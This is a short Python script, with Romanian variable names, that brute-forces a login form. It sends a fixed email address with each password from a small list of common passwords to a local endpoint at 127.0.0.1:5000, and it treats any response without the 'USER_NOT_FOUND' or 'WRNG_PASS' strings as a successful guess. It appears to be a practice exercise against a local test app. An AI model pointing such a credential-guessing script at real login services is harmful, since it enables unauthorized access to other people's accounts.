import requests

url = "http://127.0.0.1:5000/login" 

parole = ["admin", "password", "pass1", "123", "12345", "parola", "1"]

for parola in parole:
    print(f"Incearca parola: {parola}")
    
    payload = {
        "email": "cosmin2@gmail.com", 
        "password": parola}
    
    raspuns = requests.post(url, data=payload)
    
    
    if "USER_NOT_FOUND" not in raspuns.text and "WRNG_PASS" not in raspuns.text:
        print(f"\n Parola gasita a contului: {parola}")
        break